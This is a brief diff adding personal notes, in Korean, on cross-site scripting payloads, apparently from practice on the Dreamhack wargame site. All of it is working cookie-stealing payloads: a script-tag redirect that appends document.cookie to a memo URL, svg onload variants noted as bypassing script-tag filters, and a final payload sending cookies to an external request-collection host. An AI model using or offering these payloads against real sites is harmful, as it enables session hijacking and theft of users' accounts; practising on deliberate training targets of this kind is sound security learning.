@@ -1,0 +1,10 @@
+alert 될때 
+<script>location.href= "/memo?memo=showme"+ document.cookie;</script>
+
+스크립트 태그 필터링 우회
+<svg/onload=location.href="memo?memo=LastTry_"+document.cookie;>
+search.jsp?query=
+<svg/onload=location.href="search.jsp?query=LastTry_"+document.cookie;> 
+필터링 강한곳은 이것도 안됨.
+툴사용
+<script>location.href= "http://RANDOMHOST.request.dreamhack.games/?memo="+ document.cookie;</script>
